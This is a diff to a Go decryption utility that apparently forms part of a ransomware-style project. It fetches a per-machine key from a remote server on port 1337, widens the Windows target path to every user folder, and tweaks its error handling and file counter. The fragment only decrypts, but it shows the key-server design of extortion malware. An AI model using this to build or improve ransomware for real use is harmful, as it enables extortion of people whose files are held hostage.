@@ -55,7 +55,7 @@ func Decrypt(ciphertext []byte, key *[32]byte) (plaintext []byte, err error) {
 func visit(files *[]string) filepath.WalkFunc {
 	return func(path string, info os.FileInfo, err error) error {
 		if err != nil {
-			log.Fatal(err)
+			return nil
 		}
 		if info.IsDir() {
 			return nil
@@ -82,11 +82,11 @@ func visit(files *[]string) filepath.WalkFunc {
 	}
 }
 
-var server string = "192.168.0.111:1337" // do I need to tell you to change this again?
+var server string = "example.com:1337" // do I need to tell you to change this again?
 
 func main() {
 	var files []string
-	var counter int = 1
+	var counter int = 0
 	var home string
 
 	id, err := machineid.ID()
@@ -116,7 +116,7 @@ func main() {
 	decryptionKey := DecodeKey(key)
 
 	if runtime.GOOS == "windows" {
-		home = os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
+		home = os.Getenv("HOMEDRIVE") + "\\Users\\"
 		if home == "" {
 			home = os.Getenv("USERPROFILE")
 		}
@@ -129,6 +129,7 @@ func main() {
 		panic(err)
 	}
 	for _, file := range files {
+		counter++
 		fmt.Printf("\rDecrypting %d/%d: %s", counter, len(files), file)
 
 		data, err := ioutil.ReadFile(file)
@@ -146,7 +147,6 @@ func main() {
 		if err != nil {
 			continue
 		}
-		counter++
 	}
 	fmt.Printf("\n%d files decrypted.\n", len(files))
 }
